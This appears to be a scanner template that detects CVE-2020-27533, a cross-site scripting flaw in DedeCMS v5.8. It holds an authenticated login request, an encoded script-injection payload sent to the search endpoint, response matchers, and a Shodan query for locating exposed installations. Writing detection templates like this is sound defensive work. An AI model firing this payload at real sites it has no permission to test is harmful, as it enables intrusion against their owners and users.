id: CVE-2020-27533

info:
  name: DedeCMS v.5.8 - "keyword" Cross-Site Scripting
  author: ritikchaddha,lucasljm2001
  severity: medium
  description: A Cross Site Scripting (XSS) issue was discovered in the search feature of DedeCMS v.5.8 that allows malicious users to inject code into web pages, and other users will be affected when viewing web pages.
  reference:
    - https://sploitus.com/exploit?id=EDB-ID:48974
    - https://www.exploit-db.com/exploits/48974
    - https://nvd.nist.gov/vuln/detail/CVE-2020-27533
  metadata:
    shodan-query: http.component:"DedeCMS"
  tags: cve,cve2022,dedecms,xss,authenticated

requests:
  - raw:
      - |
        POST /member/index_do.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        fmdo=login&dopost=login&keeptime=604800&userid={{userid}}&pwd={{pwd}}

      - |
        POST /src/dede/action_search.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        keyword=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</script><script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
